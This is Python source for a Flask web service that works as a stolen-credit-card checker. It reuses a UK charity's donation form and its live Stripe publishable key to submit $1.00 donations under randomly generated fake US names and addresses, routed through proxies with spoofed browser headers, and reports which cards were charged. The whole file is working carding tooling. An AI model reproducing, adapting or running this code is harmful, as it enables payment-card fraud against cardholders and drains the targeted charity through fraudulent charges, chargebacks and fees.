import requests
import json
import random
import re
import os
import time
import traceback
from flask import Flask, request, jsonify
from typing import Dict, Optional

app = Flask(__name__)

class USAddressGenerator:
    LOCATIONS = [
        {"city": "New York", "state": "NY", "zip": "10001", "state_full": "New York"},
        {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_full": "California"},
        {"city": "Chicago", "state": "IL", "zip": "60601", "state_full": "Illinois"},
        {"city": "Houston", "state": "TX", "zip": "77001", "state_full": "Texas"},
        {"city": "Phoenix", "state": "AZ", "zip": "85001", "state_full": "Arizona"},
        {"city": "Philadelphia", "state": "PA", "zip": "19019", "state_full": "Pennsylvania"},
        {"city": "San Antonio", "state": "TX", "zip": "78201", "state_full": "Texas"},
        {"city": "San Diego", "state": "CA", "zip": "92101", "state_full": "California"},
        {"city": "Dallas", "state": "TX", "zip": "75201", "state_full": "Texas"},
        {"city": "Austin", "state": "TX", "zip": "78701", "state_full": "Texas"},
    ]
    
    FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
    STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Ave", "Lake St", "Hill St", "Park Ave"]
    
    @classmethod
    def generate_address(cls) -> Dict[str, str]:
        location = random.choice(cls.LOCATIONS)
        street_num = random.randint(100, 9999)
        street = random.choice(cls.STREETS)
        
        return {
            "first_name": random.choice(cls.FIRST_NAMES),
            "last_name": random.choice(cls.LAST_NAMES),
            "address": f"{street_num} {street}",
            "address_2": random.choice(["", f"Apt {random.randint(1, 50)}", f"#{random.randint(1, 100)}", ""]),
            "city": location["city"],
            "state": location["state"],
            "state_full": location["state_full"],
            "zip": location["zip"],
            "email": f"{random.choice(cls.FIRST_NAMES).lower()}{random.randint(1, 999)}@gmail.com"
        }

def format_proxy(proxy: str) -> str:
    if not proxy:
        return None
    
    proxy = proxy.strip()
    
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    
    if '@' in proxy and ':' in proxy.split('@')[0]:
        return f"http://{proxy}"
    
    parts = proxy.split(':')
    if len(parts) == 4:
        ip, port, user, password = parts
        if '.' in ip or ':' in ip:
            return f"http://{user}:{password}@{ip}:{port}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    
    if len(parts) == 2:
        return f"http://{proxy}"
    
    if '@' in proxy:
        return f"http://{proxy}"
    
    return f"http://{proxy}"

class BravehoundDonationBot:
    def __init__(self, card_data: str, proxy: Optional[str] = None):
        parts = card_data.split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format. Expected: number|month|year|cvc")
            
        self.card_number = str(parts[0].strip())
        self.exp_month = str(parts[1].strip())
        self.exp_year = str(parts[2].strip())
        self.cvc = str(parts[3].strip())
        
        self.session = requests.Session()
        
        if proxy:
            formatted_proxy = format_proxy(proxy)
            if formatted_proxy:
                proxy_dict = {
                    'http': formatted_proxy,
                    'https': formatted_proxy
                }
                self.session.proxies.update(proxy_dict)
        
        self.address = USAddressGenerator.generate_address()
        self.form_hash = None
        self.payment_method_id = None
        
    def get_form_hash(self):
        url = "https://www.bravehound.co.uk/wp-admin/admin-ajax.php"
        payload = {
            'action': "give_donation_form_reset_all_nonce",
            'give_form_id': "13302"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.bravehound.co.uk",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.bravehound.co.uk/donation/",
            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
            'priority': "u=1, i",
        }
        response = self.session.post(url, data=payload, headers=headers)
        data = response.json()
        self.form_hash = data['data']['give_form_hash']
        return self.form_hash
    
    def create_payment_method(self):
        url = "https://api.stripe.com/v1/payment_methods"
        
        # Properly format exp_year - get last 2 digits
        exp_year_str = self.exp_year.strip()
        if len(exp_year_str) >= 2:
            exp_year = exp_year_str[-2:]
        else:
            exp_year = exp_year_str.zfill(2)
        
        payload = {
            'type': "card",
            'billing_details[name]': f"{self.address['first_name']} {self.address['last_name']}",
            'billing_details[email]': self.address['email'],
            'card[number]': self.card_number,
            'card[cvc]': self.cvc,
            'card[exp_month]': self.exp_month,
            'card[exp_year]': exp_year,
            'guid': "c2d15411-4ea6-4412-96f9-5964b19feacc9a03e0",
            'muid': "2cbebced-2e78-43c8-8df0-d77c88f32d7effd1d6",
            'sid': "515d1b26-d906-4b1d-a218-e9cb37dbceebeed15b",
            'payment_user_agent': "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; split-card-element",
            'referrer': "https://www.bravehound.co.uk",
            'time_on_page': str(random.randint(30000, 50000)),
            'client_attribution_metadata[client_session_id]': "63059f23-5d3b-4e7b-b77f-7c5d2fc5630d",
            'client_attribution_metadata[merchant_integration_source]': "elements",
            'client_attribution_metadata[merchant_integration_subtype]': "split-card-element",
            'client_attribution_metadata[merchant_integration_version]': "2017",
            'key': "pk_live_SMtnnvlq4TpJelMdklNha8iD",
            '_stripe_account': "acct_1GZhGGEfZQ9gHa50",
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://js.stripe.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://js.stripe.com/",
            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
            'priority': "u=1, i"
        }
        
        response = self.session.post(url, data=payload, headers=headers)
        
        # Check if response is valid JSON
        try:
            result = response.json()
        except Exception as e:
            raise Exception(f"Stripe returned invalid JSON: {response.text[:200]}")
        
        # Check for errors in response
        if 'error' in result:
            raise Exception(f"Stripe error: {result['error'].get('message', 'Unknown error')}")
        
        if 'id' not in result:
            raise Exception(f"Missing payment method ID in response: {result}")
        
        self.payment_method_id = result['id']
        return self.payment_method_id
    
    def submit_donation(self):
        url = "https://www.bravehound.co.uk/donation/"
        params = {
            'payment-mode': "stripe",
            'form-id': "13302"
        }
        payload = {
            'give-honeypot': "",
            'give-form-id-prefix': "13302-1",
            'give-form-id': "13302",
            'give-form-title': "Bravehound Donations",
            'give-current-url': "https://www.bravehound.co.uk/donation/",
            'give-form-url': "https://www.bravehound.co.uk/donation/",
            'give-form-minimum': "1.00",
            'give-form-maximum': "999999.99",
            'give-form-hash': self.form_hash,
            'give-price-id': "custom",
            'give-recurring-logged-in-only': "",
            'give-logged-in-only': "1",
            '_give_is_donation_recurring': "0",
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': "1.00",
            'give_stripe_payment_method': self.payment_method_id,
            'payment-mode': "stripe",
            'give_first': self.address['first_name'],
            'give_last': self.address['last_name'],
            'give_email': self.address['email'],
            'card_name': f"{self.address['first_name']} {self.address['last_name']}",
            'give_gift_check_is_billing_address': "yes",
            'give_gift_aid_address_option': "billing_address",
            'give_gift_aid_card_first_name': "",
            'give_gift_aid_card_last_name': "",
            'give_gift_aid_billing_country': "US",
            'give_gift_aid_card_address': self.address['address'],
            'give_gift_aid_card_address_2': self.address['address_2'],
            'give_gift_aid_card_city': self.address['city'],
            'give_gift_aid_card_state': self.address['state'],
            'give_gift_aid_card_zip': self.address['zip'],
            'give_action': "purchase",
            'give-gateway': "stripe"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://www.bravehound.co.uk",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe&level-id=custom&custom-amount=1.00",
            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
            'priority': "u=0, i",
        }
        response = self.session.post(url, params=params, data=payload, headers=headers)
        return self._parse_response(response.text)
    
    def _parse_response(self, response_text):
        # Check for errors in response
        if 'card_declined' in response_text.lower():
            return {"status": "declined", "message": "Card declined"}
        
        if 'insufficient_funds' in response_text.lower():
            return {"status": "declined", "message": "Insufficient funds"}
        
        error_match = re.search(r'<p>.*?<strong>Error</strong>:(.*?)<br', response_text, re.DOTALL)
        if error_match:
            error_msg = error_match.group(1).strip()
            return {"status": "error", "message": error_msg}
        
        # Check for success
        success_patterns = ['thank you', 'successfully', 'succeeded', 'your donation was successful', 'donation confirmed']
        for pattern in success_patterns:
            if re.search(pattern, response_text, re.I):
                return {"status": "success", "message": "Charged $1.00 successfully"}
        
        return {"status": "unknown", "message": "Unknown Response"}
    
    def run(self):
        try:
            self.get_form_hash()
            time.sleep(random.uniform(0.5, 2))
            self.create_payment_method()
            time.sleep(random.uniform(0.5, 2))
            result = self.submit_donation()
            result["card"] = self.card_number
            result["address"] = f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
            return result
        except Exception as e:
            return {
                "status": "error",
                "message": str(e),
                "card": self.card_number,
                "address": f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
            }

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format. Expected: CC|MM|YYYY|CVV")
    
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

@app.route('/check', methods=['GET'])
def bravehound_checker():
    try:
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter. Format: CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            formatted_card = f"{cc_parts['cc']}|{cc_parts['mes']}|{cc_parts['ano']}|{cc_parts['cvv']}"
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        bot = BravehoundDonationBot(formatted_card, proxy_str)
        result = bot.run()
        
        response_data = {
            "Gateway": "Stripe (Bravehound)",
            "Price": 1.00,
            "Response": result.get('message', 'Unknown'),
            "Status": result.get('status') == 'success',
            "StatusDetail": result.get('status', 'unknown'),
            "cc": cc_string,
            "address_used": result.get('address', 'N/A')
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "Stripe (Bravehound)",
            "Price": 1.00,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get('cc', '')
        }), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)